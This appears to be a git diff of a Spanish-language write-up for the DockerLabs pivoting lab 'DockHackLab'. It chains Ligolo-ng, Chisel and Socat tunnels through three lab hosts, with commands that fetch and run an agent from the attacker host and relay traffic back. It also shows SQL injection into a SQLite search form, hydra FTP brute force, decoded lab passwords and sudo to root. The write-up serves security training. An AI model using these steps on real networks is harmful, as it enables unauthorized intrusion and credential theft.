@@ -1,304 +1,411 @@
 
 # 📑 Writeup: Máquina DockHackLab 🚀
 
-<img width="426" height="463" alt="image" src="https://github.com/user-attachments/assets/ffb551bf-d13f-4fc5-a273-65a3667984e9" />
-
 ![OS: Linux](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux)
 ![Platform: DockerLabs](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)
 ![Dificultad: hard](https://img.shields.io/badge/Dificultad-hard-%23FF0000?style=for-the-badge)
 
-#  Escaneo de  servicios  y puertos y serviicios 
+> **NOTA:** Esta máquina simula movimiento lateral (Pivoting) entre tres redes. No es un CTF de vulnerabilidad específica, según el creador de la máquina (PatxaSec).
 
-`- NOTA` : `Esto no es un laboratorio de vulnerar y encontrar una vulnerabilidad especifica, segun el creador de la maquina (PatxaSec) es una maquina que simula el funcionamiento movimiento laterar (Pivoting) `
+---
 
+# 🖥️ Primera Máquina — Hades (10.10.10.2)
 
-# Enumeracion de puertos y servicios 
+## 🔍 Enumeración de Puertos
+
 ```ruby
- nmap -sV -Pn -sC --min-rate 5000 -O --top-port 50000 10.10.10.2  
-Starting Nmap 7.99 ( https://nmap.org ) 
-Nmap scan report for 10.10.10.2
-Host is up (0.00019s latency).
-Not shown: 8384 closed tcp ports (reset)
-PORT     STATE SERVICE    VERSION
-22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 7e:85:1a:70:b5:2e:c6:35:73:9b:64:77:ba:5f:72:8b (ECDSA)
-|_  256 0a:67:56:22:1e:a1:aa:05:44:f0:b9:05:75:6d:9c:36 (ED25519)
-80/tcp   open  http       Werkzeug httpd 3.0.4 (Python 3.12.3)
-|_http-server-header: Werkzeug/3.0.4 Python/3.12.3
-|_http-title: Not A CTF
-2222/tcp open  tcpwrapped
-|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
-MAC Address: 16:1E:63:32:B5:15 (Unknown)
-Device type: general purpose
-Running: Linux 4.X|5.X
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
-OS details: Linux 4.15 - 5.19
-Network Distance: 1 hop
+nmap -sV -Pn -sC --min-rate 5000 -O --top-port 50000 10.10.10.2
 ```
 
-# 🛡️ Reporte de Escaneo Nmap - 10.10.10.2
-
-### 📊 Información del Objetivo
-| Categoría | Detalle |
-| :--- | :--- |
-| **Sistema Operativo** | Linux 4.15 - 5.19 |
-| **Distancia de Red** | 1 salto (hop) |
-| **Título del Sitio Web** | `Not A CTF` |
-
----
-
-### ⚙️ Configuración del Comando
-| Parámetro | Definición y Uso |
-| :--- | :--- |
-| **`-sV`** | **Detección de versiones:** Identifica el software y la versión de los servicios. |
-| **`-Pn`** | **Omitir Ping:** No verifica si el host responde a ICMP, asume que está activo. |
-| **`-sC`** | **Scripts NSE:** Ejecuta los scripts de enumeración y seguridad por defecto. |
-| **`--min-rate 5000`** | **Velocidad:** Mantiene una tasa mínima de 5000 paquetes por segundo. |
-| **`-O`** | **Huella de S.O.:** Intenta identificar el sistema operativo mediante el stack TCP/IP. |
-| **`--top-ports 50000`** | **Alcance:** Escanea los 50,000 puertos más comunes del ranking de Nmap. |
-
----
-
-### 🔍 Servicios Detectados
 | Puerto | Estado | Servicio | Versión |
-| :--- | :--- | :--- | :--- |
+|--------|--------|----------|---------|
 | `22/tcp` | ✅ Abierto | SSH | OpenSSH 9.6p1 Ubuntu |
 | `80/tcp` | ✅ Abierto | HTTP | Werkzeug httpd 3.0.4 (Python 3.12.3) |
-| `2222/tcp` | ✅ Abierto | EtherNet/IP-1 | tcpwrapped |
+| `2222/tcp` | ✅ Abierto | tcpwrapped | — |
 
-# Puerto 80
-
-arkdown
-## 🌐 Análisis del Servicio Web (Puerto 80)
-
-Al inspeccionar el puerto 80, confirmamos mediante el escaneo de Nmap que el servidor corre bajo **Python**. La interfaz presenta un diseño minimalista con un mensaje de advertencia.
-
-### 🖼️ Interfaz de Usuario (Front-end)
-La página muestra un banner informativo con el texto: *"¡Atención, esto no es un CTF!"*. Aunque el sitio menciona el uso de **Ligolo**, la arquitectura de la red nos obligará a utilizar herramientas de pivoting alternativas como **Chisel** y **Socat**.
-
-| Elemento | Observación |
-| :--- | :--- |
-| **Tecnología** | Python (Werkzeug) |
-| **Interactividad** | Botón de cierre de banner informativo |
-| **Propósito** | Práctica de Pivoting y post-explotación |
+| Parámetro | Descripción |
+|-----------|-------------|
+| `-sV` | Detecta versiones de servicios |
+| `-Pn` | Omite ping, asume host activo |
+| `-sC` | Ejecuta scripts NSE por defecto |
+| `--min-rate 5000` | Mínimo 5000 paquetes/segundo |
+| `-O` | Detecta sistema operativo |
+| `--top-ports 50000` | Escanea los 50k puertos más comunes |
 
 ---
 
-## 🕵️ Encontrando el Vector de Acceso (Código Fuente)
+## 🌐 Puerto 80 — Análisis Web
 
-Como el front-end no ofrece vectores de ataque directos (formularios, subida de archivos, etc.), procedemos a inspeccionar el **Código Fuente (Ctrl+U)**. En el footer del documento, localizamos información sensible ofuscada:
+El servidor corre **Python/Werkzeug**. La página muestra el banner *"¡Atención, esto no es un CTF!"*.
+No hay formularios ni vectores directos en el front-end.
 
-> **Hallazgo:** Se identifica un string codificado que sospechamos contiene las credenciales de acceso para el servicio SSH.
+**Vector de acceso:** Inspeccionar el código fuente (`Ctrl+U`) revela un string codificado en el footer.
 
-### 🛠️ Análisis del Pipeline de Decodificación
+### 🔓 Decodificación de Credenciales
 
-El comando utiliza una técnica de "capas" para extraer la credencial en claro. A continuación se explica la función de cada transformación:
+El string usa tres capas de ofuscación:
 
-| Herramienta | Función Técnica | Razón de uso en este reto |
-| :--- | :--- | :--- |
-| **`base32 -d`** | Decodifica un flujo de datos en Base32 (alfabeto A-Z, 2-7). | El string original usa caracteres permitidos por Base32 y tiene un padding de `====`. Es la primera capa de ofuscación. |
-| **`base64 -d`** | Decodifica el resultado anterior usando el estándar Base64. | Tras el primer paso, los datos resultantes seguían codificados. Base64 permite comprimir datos binarios en texto legible. |
-| **`xxd -r -p`** | **Reverse Hex Dump:** Convierte una cadena hexadecimal a su representación en ASCII/String. | La salida de Base64 devolvió valores en HEX (ej. `503073...`). `xxd` "limpia" esos bytes para que podamos leer la contraseña final. |
+| Herramienta | Función |
+|-------------|---------|
+| `base32 -d` | Primera capa — alfabeto A-Z, 2-7 con padding `====` |
+| `base64 -d` | Segunda capa — decodifica el resultado intermedio |
+| `xxd -r -p` | Tercera capa — convierte hex a ASCII legible |
 
----
-
-### 🔄 Flujo de Transformación de Datos
-
-1. **Entrada:** Cadena larga con padding `====` (Típico de codificaciones de bloques).
-2. **Paso 1 (Base32):** El resultado es un string intermedio todavía codificado.
-3. **Paso 2 (Base64):** El resultado es una cadena de caracteres hexadecimales.
-4. **Paso 3 (XXD):** Traducción de los pares hexadecimales a caracteres legibles.
-
-**Resultado Final:** `P0seidón2022!`
-
-### 🖥️ Configuración del Servidor (Proxy) en Máquina Atacante
-
-Antes de conectar el agente, debemos preparar nuestro entorno local para recibir la conexión y gestionar el tráfico tunelizado.
-
-| Componente | Acción / Comando | Descripción Técnica |
-| :--- | :--- | :--- |
-| **Directorio** | `cd /path/to/ligolo/` | Ubicación del binario del Proxy. |
-| **Ejecución** | `./proxy -selfcert` | Inicia el servidor usando un certificado auto-firmado para cifrar el túnel. |
-| **Puerto Local** | `11601` (Default) | Puerto que quedará a la escucha (Listening) para la conexión del agente. |
-
-```ruby
-INFO[0000] Loading configuration file ligolo-ng.yaml    
-WARN[0000] daemon configuration file not found. Creating a new one... 
-? Enable Ligolo-ng WebUI? Yes
-? Allow CORS Access from https://webui.ligolo.ng? Yes
-WARN[0002] WebUI enabled, default username and login are ligolo:password - make sure to update ligolo-ng.yaml to change credentials! 
-WARN[0002] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
-ERRO[0002] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
-INFO[0002] Listening on 0.0.0.0:11601                   
-INFO[0002] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
-WARN[0002] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
-    __    _             __                       
-   / /   (_)___ _____  / /___        ____  ____ _                                                                                                                                                                                           
-  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                                                                                                                           
- / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                                                                                                                            
-/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                                                                                                                             
-        /____/                          /____/                                                                                                                                                                                              
-                                                                                                                                                                                                                                            
-  Made in France ♥            by @Nicocha30!                                                                                                                                                                                                
-  Version: 0.8.3                                                                     
+```bash
+echo 'STRING_DEL_FOOTER' | base32 -d | base64 -d | xxd -r -p
 ```
----
 
-### 🛠️ Configuración de la Interfaz de Red (Networking)
-
-Para que nuestro sistema operativo sepa cómo enviar paquetes a la red interna de Poseidón, configuramos una interfaz **TUN**:
-
-| Paso | Comando | Propósito |
-| :--- | :--- | :--- |
-| **1. Crear TUN** | `sudo ip link add dev ligolo type tun` | Crea la interfaz virtual llamada `ligolo`. |
-| **2. Levantar** | `sudo ip link set ligolo up` | Activa la interfaz para que pueda transmitir datos. |
-| **3. Enrutar** | `sudo ip route add 20.20.20.0/24 dev ligolo` | Envía todo el tráfico destinado a la red `20.20.20.x` a través del túnel. |
+**Resultado:** `P0seidón2022!`
 
 ---
 
-### 🔗 Sincronización Agente-Proxy
+## 🚀 Pivoting con Ligolo-ng — Acceso a Red Interna (20.20.20.0/24)
 
-Una vez que el agente se conecta desde Hades, la consola del Proxy mostrará un aviso de conexión. Debes seguir este flujo para activar el túnel:
+### ¿Qué es Ligolo-ng?
 
-1. **Seleccionar Sesión:** Escribe `session` y elige el número de ID correspondiente a la conexión de Hades.
-2. **Iniciar Túnel:** Escribe `start` para comenzar el intercambio de paquetes cuando ya tengas el agente conectado a ligolo .
+**Ligolo-ng** es una herramienta de pivoting que crea un túnel TUN entre la máquina atacante y una máquina comprometida, permitiendo enrutar tráfico hacia redes internas de forma transparente, sin necesidad de proxychains.
 
-
-
-> **Tip** Verifica siempre con `ip route` que la ruta hacia la red `20.20.20.0/24` apunta correctamente a la interfaz `ligolo`. Si no lo haces, intentarás salir por tu puerta de enlace predeterminada (tu router) y no llegarás a Poseidón.
-
-### 📂 Transferencia y Ejecución del Agente (Hades)
-
-Para que **Hades** actúe como nuestro puente, debemos transferir el binario del agente y ejecutarlo apuntando a nuestra IP de atacante.
-
-#### 1. Preparación en la Máquina Atacante
-Primero, organizamos el binario y levantamos un servidor web temporal para la transferencia:
-
-| Paso | Acción | Comando |
-| :--- | :--- | :--- |
-| **Directorio** | Crear carpeta de trabajo | `mkdir ligolo && cd ligolo` |
-| **Servidor** | Levantar server Python | `python3 -m http.server 80` |
+La arquitectura es:
+Atacante ──(túnel TLS)──> Proxy Ligolo
+│
+Hades (agente) ──> Red 20.20.20.0/24
 
 ---
 
-#### 2. Descarga y Despliegue en Hades
-Desde la sesión de SSH en **Hades**, procedemos a descargar el agente y darle los privilegios necesarios para su ejecución:
+### 📥 Paso 1 — Descargar Ligolo-ng
 
-| Acción | Comando | Descripción |
-| :--- | :--- | :--- |
-| **Descarga** | `wget http://10.0.2.15/agent_linux_amd64 -O agent` | Descarga el binario desde nuestra IP. |
-| **Permisos** | `chmod +x agent` | Otorga permisos de ejecución al binario. |
-| **Conexión** | `./agent -connect 10.0.2.15:11601 -ignore-cert` | Conecta el agente a nuestro Proxy local. |
+En la máquina atacante descargamos ambos binarios desde el repositorio oficial:
+
+```bash
+# Proxy (corre en el atacante)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
+
+# Agente (se transfiere a la víctima)
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
+
+# Descomprimir ambos
+tar -xzvf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
+tar -xzvf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
+```
 
 ---
 
-### 🚀 Estableciendo la Comunicación
+### ⚙️ Paso 2 — Iniciar el Proxy en el Atacante
 
-Al ejecutar el comando anterior, verás en tu terminal de **Hades** un mensaje indicando que la conexión ha sido exitosa. 
+```bash
+chmod +x proxy
+./proxy -selfcert
+```
 
+El proxy queda escuchando en el puerto `11601` esperando conexiones del agente:
+INFO[0000] Listening on 0.0.0.0:11601
 
+> **Nota:** `-selfcert` genera un certificado TLS auto-firmado para cifrar el túnel. No requiere configuración adicional.
 
-> **Nota Crítica:** El flag `-ignore-cert` es fundamental ya que estamos usando un certificado auto-firmado (`-selfcert`) en el proxy. Sin esto, la conexión sería rechazada por motivos de seguridad.
+---
 
-#### Estado del Túnel:
-1. **Proxy Atacante:** Recibe la conexión y crea la sesión.
-2. **Agente Hades:** Mantiene el túnel abierto y redirige el tráfico.
-3. **Resultado:** Ahora podemos gestionar la red interna desde la consola del proxy escribiendo `session`.
+### 🌐 Paso 3 — Transferir el Agente a Hades
 
+Levantamos un servidor HTTP temporal en el atacante para servir el binario:
 
-# 🌊 Máquina Poseidón (20.20.20.3)
+```bash
+# En el atacante — desde el directorio donde está el agente
+python3 -m http.server 80
+```
 
-Tras activar el túnel con **Ligolo-ng** y añadir la ruta en nuestra máquina atacante (`sudo ip route add 20.20.20.0/24 dev ligolo`), ya tenemos conectividad nativa con la red interna.
+Desde la sesión SSH en **Hades**, descargamos y ejecutamos el agente:
+
+```bash
+# En Hades
+wget http://10.0.2.15/agent -O agent
+chmod +x agent
+./agent -connect 10.0.2.15:11601 -ignore-cert
+```
+
+| Flag | Descripción |
+|------|-------------|
+| `-connect` | IP y puerto del proxy en el atacante |
+| `-ignore-cert` | Ignora la verificación del certificado auto-firmado |
+
+En la consola del proxy veremos la conexión entrante:
+INFO[0012] Agent connected — hades@10.10.10.2
+
+---
+
+### 🖧 Paso 4 — Crear y Configurar la Interfaz TUN
+
+En el atacante creamos la interfaz virtual que recibirá el tráfico tunelizado:
+
+```bash
+# Crear la interfaz TUN
+sudo ip link add dev ligolo type tun
+
+# Levantar la interfaz
+sudo ip link set ligolo up
+
+# Enrutar la red interna a través del túnel
+sudo ip route add 20.20.20.0/24 dev ligolo
+```
+
+Verificamos que la ruta esté activa:
+
+```bash
+ip route | grep ligolo
+# 20.20.20.0/24 dev ligolo scope link
+```
+
+---
+
+### 🚀 Paso 5 — Activar el Túnel en Ligolo
+
+En la consola interactiva de Ligolo:
+ligolo-ng » session
+Seleccionar el ID de la sesión de Hades
+ligolo-ng » start
+El túnel queda activo
+
+A partir de este momento podemos alcanzar **20.20.20.0/24 directamente**, sin proxychains.
+
+---
+
+# 🌊 Segunda Máquina — Poseidón (20.20.20.3)
 
 ## 🔍 Enumeración de Puertos
 
-Gracias a la interfaz `tun`, podemos lanzar `nmap` directamente sin necesidad de `proxychains` o configuraciones adicionales.
+Con el túnel activo lanzamos nmap directamente:
 
-### Ejecución del Escaneo
-```ruby
+```bash
 nmap -sT -sCV -n -Pn 20.20.20.3
-
-Starting Nmap 7.99 ( https://nmap.org ) 
-Nmap scan report for 20.20.20.3
-Host is up (0.040s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
-| ssh-hostkey: 
-|   3072 41:ea:e9:70:88:38:11:2b:1f:36:3a:cb:bd:1a:bb:e2 (RSA)
-|   256 2c:d8:bf:01:05:7e:7a:70:38:7c:7b:f2:ba:54:4b:20 (ECDSA)
-|_  256 20:37:e5:92:15:dc:69:18:dc:09:bb:69:74:6d:ae:c5 (ED25519)
-80/tcp open  http    Apache httpd 2.4.54 ((Debian))
-|_http-title: Dojos El Papapasito del mar
-|_http-server-header: Apache/2.4.54 (Debian)S
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.01 seconds
-                                                                 
 ```
-## 🔍 Enumeración de Puertos
 
-Gracias a la interfaz virtual, podemos lanzar `nmap` directamente sin necesidad de configuraciones adicionales.
-
-| Puerto | Estado | Servicio | Versión / Detalles |
-| :--- | :--- | :--- | :--- |
-| **22/tcp** | open | ssh | OpenSSH 8.4p1 Debian 5+deb11u3 |
-| **80/tcp** | open | http | Apache httpd 2.4.54 (Debian) |
-
-**Análisis del Servicio HTTP:**
-* **Título:** `Dojos El Papapasito del mar`
-* **Servidor:** `Apache/2.4.54 (Debian)`
-* **Sistema Operativo:** Linux (Debian)
+| Puerto | Estado | Servicio | Versión |
+|--------|--------|----------|---------|
+| `22/tcp` | ✅ Abierto | SSH | OpenSSH 8.4p1 Debian |
+| `80/tcp` | ✅ Abierto | HTTP | Apache httpd 2.4.54 (Debian) |
 
 ---
 
-## 🌐 Acceso Directo a la Web
+## 🕵️ Explotación — SQLi en Base de Datos
 
-A diferencia de otros métodos de pivoting, **Ligolo-ng** nos permite acceder a los servicios web de forma transparente abriendo directamente `http://20.20.20.3` en el navegador.
+El puerto 80 muestra *"Dojos El Papapasito del mar"* con secciones: **Buscar, Ranking y Perfil**.
 
-<img width="1910" height="993" alt="image" src="https://github.com/user-attachments/assets/2ff132a4-f65e-4af5-9723-2fff8c600c37" />
+El código fuente revela que la búsqueda hace POST a `database.php`. Confirmamos **SQLite** inyectando:
 
-### Análisis del Front-end
-En la barra de navegación vemos tres apartados: **Buscar, Ranking y Perfil**. A nosotros nos interesa "Buscar", ya que nos lleva a un subdirectorio con un sistema de búsqueda.
+```sql
+select name from sqlite_master
+```
 
-<img width="1912" height="993" alt="image" src="https://github.com/user-attachments/assets/9e15e60b-fec5-46f3-8c6e-3154bbf1b7ae" />
+Tablas encontradas: **`usuarios`** y **`contrasena`**.
 
----
+### 🔓 Decodificación de Credenciales
 
-## 🕵️ Explotación de la Base de Datos
+Contraseña extraída (usuario `megalodon`):
+sha1sha1
+sha1hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=
 
-Revisamos el código fuente para ver cómo tramita la petición este sistema de búsqueda.
-
-<img width="652" height="366" alt="image" src="https://github.com/user-attachments/assets/3374b8e3-f9c8-406e-95bd-74d5e20bdc6f" />
-
-Podemos observar cómo tramita mediante el método **POST** una petición a un archivo `database.php`. Entendemos que pasa el parámetro del campo de búsqueda y realiza la consulta a la base de datos con él.
-
-Tras varios intentos, confirmamos que se emplea **SQLite**, ya que estas bases de datos usan una tabla interna llamada `sqlite_master`. Introducimos en el campo de búsqueda la consulta: `select name from sqlite_master`.
-
-<img width="1011" height="344" alt="image" src="https://github.com/user-attachments/assets/8fe65f05-6aca-4f85-9c76-e736f6033c31" />
-
-Vemos dos tablas interesantes: **"usuarios"** y **"contrasena"**.
-
-
-
----
-
-## 🔓 Decodificación de Credenciales
-
-Extraemos los datos de los usuarios `poseidon` y `megalodon`. Las contraseñas parecen codificadas:
-
-Usando el mismo procedimiento que en la máquina Hades (Base32 -> Base64 -> Hex), decodificamos el string:
 
 ```bash
 echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' | base32 -d | base64 -d | xxd -r -p
 ```
-Resultado: Templ02019!
-🔑 Acceso por SSH y EscaladaEntramos por SSH con el usuario megalodon hacia la IP 20.20.20.3. Una vez dentro, verificamos permisos de sudo.UsuarioIP Comando de 
-```ruby
-Escaladamegalodon20.20.20.3
+
+**Resultado:** `Templ02019!`
+
+### 🔑 Acceso SSH
+
+```bash
+ssh megalodon@20.20.20.3
+# Contraseña: Templ02019!
+
+sudo bash  # Usuario tiene sudo completo → root ✅
 ```
 
-<img width="908" height="624" alt="image" src="https://github.com/user-attachments/assets/86491aab-31cc-414f-8d21-1bf303083533" />
+**Segunda máquina — Poseidón completada. ✅**
 
+---
+
+# ⚡ Tercera Máquina — Zeus (30.30.30.3)
+
+## ⚙️ Pivoting con Chisel + Socat
+
+Poseidón tiene conectividad con Zeus pero no podemos usar Ligolo directamente desde aquí. Encadenamos el túnel usando **Chisel** y **Socat**.
+
+### Verificar Arquitectura
+
+```bash
+# En Poseidón
+uname -m
+# x86_64 — misma arquitectura que Hades, usamos el mismo Chisel
+```
+
+### Transferir Chisel a Poseidón
+
+Desde **Hades** usamos `scp` para pasar el binario a Poseidón:
+
+```bash
+scp chisel megalodon@20.20.20.3:/tmp/chisel
+```
+
+![scp_chisel_poseidon](screenshots/2-Poseidon/scp_chisel_poseidon.png)
+
+---
+
+### 🔁 Configurar Socat en Hades
+
+Abrimos el puerto `1111` en Hades y reenviamos todo el tráfico al servidor Chisel del atacante:
+
+```bash
+socat TCP-LISTEN:1111,fork TCP:10.0.2.15:1080
+```
+
+![socat_hades](screenshots/2-Poseidon/socat_hades.png)
+
+---
+
+### 🔗 Configurar Chisel en Poseidón
+
+Conectamos Poseidón al puerto `1111` de Hades. Usamos el puerto `8888` para el nuevo proxy SOCKS ya que el `1080` está en uso:
+
+```bash
+chmod +x /tmp/chisel
+./chisel client 20.20.20.2:1111 socks --socks5 8888
+```
+
+![chisel_poseidon](screenshots/2-Poseidon/chisel_poseidon.png)
+
+En el servidor de Chisel del atacante vemos la nueva conexión:
+
+![sesion2_chisel](screenshots/2-Poseidon/sesion2_chisel.png)
+
+---
+
+### 📝 Actualizar Proxychains
+
+Editamos `/etc/proxychains.conf`:
+
+```bash
+# Comentar la línea anterior:
+# socks5 127.0.0.1 1080
+
+# Agregar la nueva:
+socks5 127.0.0.1 8888
+```
+
+![proxylist2](screenshots/2-Poseidon/proxylist2.png)
+
+---
+
+## 🔍 Enumeración de Puertos
+
+```bash
+proxychains4 -q nmap -sT -sCV -n -Pn 30.30.30.3
+```
+
+![target_zeus](screenshots/3-Zeus/target_zeus.png)
+
+| Puerto | Estado | Servicio |
+|--------|--------|---------|
+| `21/tcp` | ✅ | FTP |
+| `22/tcp` | ✅ | SSH |
+| `80/tcp` | ✅ | HTTP — Apache (página default) |
+| `139/tcp` | ✅ | SMB/Samba |
+| `445/tcp` | ✅ | SMB/Samba |
+
+---
+
+## 👥 Puertos 139 y 445 — Enumeración SMB
+
+```bash
+proxychains4 -q enum4linux -a 30.30.30.3
+```
+
+![samba_users](screenshots/3-Zeus/samba_users.png)
+
+No hay directorios interesantes pero encontramos dos usuarios: **`hercules`** y **`rayito`**.
+
+---
+
+## 🌐 Puerto 80
+
+Configuramos el proxy con el puerto `8888` para acceder desde el navegador:
+
+![proxy_zeus](screenshots/3-Zeus/proxy_zeus.png)
+
+Vemos la página por defecto de Apache. El código fuente no revela nada y el fuzzing con **wfuzz** no encuentra subdirectorios.
+
+---
+
+## 📂 Puerto 21 — Fuerza Bruta FTP
+
+Con los dos usuarios encontrados realizamos fuerza bruta usando una versión reducida del rockyou con las primeras 5000 contraseñas:
+
+```bash
+proxychains4 -q hydra -L users -P minirock ftp://30.30.30.3
+```
+
+![credentials_ftp](screenshots/3-Zeus/credentials_ftp.png)
+
+**Credenciales encontradas:** `hercules:thunder1`
+
+---
+
+### Análisis del Servidor FTP
+
+```bash
+ftp 30.30.30.3
+# usuario: hercules | contraseña: thunder1
+get archivo.exe
+```
+
+![ftp_zeus](screenshots/3-Zeus/ftp_zeus.png)
+
+Analizamos el binario con `strings`:
+
+```bash
+strings archivo.exe
+```
+
+![kratos_text](screenshots/3-Zeus/kratos_text.png)
+
+Encontramos un string codificado en **Base64**:
+
+```bash
+echo 'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=' | base64 -d
+```
+
+**Resultado:** `electrocut4c10n!`
+
+---
+
+## 🔑 Acceso SSH — Zeus
+
+```bash
+proxychains4 -q ssh rayito@30.30.30.3
+# Contraseña: electrocut4c10n!
+
+sudo bash  # Usuario tiene sudo completo → root ✅
+```
+
+**Tercera máquina — Zeus completada. ✅**
+
+---
+
+# 🗺️ Resumen de Infraestructura
+Atacante (10.0.2.15)
+│
+│ Ligolo-ng (túnel TUN directo)
+▼
+Hades (10.10.10.2) ────────── red 20.20.20.0/24
+│
+│ Socat puerto 1111 → reenvía a Chisel del atacante
+▼
+Poseidón (20.20.20.3) ──────── red 30.30.30.0/24
+│
+│ Chisel SOCKS5 puerto 8888
+▼
+Zeus (30.30.30.3)
+
+| Máquina | IP | Usuario | Contraseña |
+|---------|-----|---------|------------|
+| Hades | 10.10.10.2 | — | `P0seidón2022!` |
+| Poseidón | 20.20.20.3 | megalodon | `Templ02019!` |
+| Zeus | 30.30.30.3 | rayito | `electrocut4c10n!` |
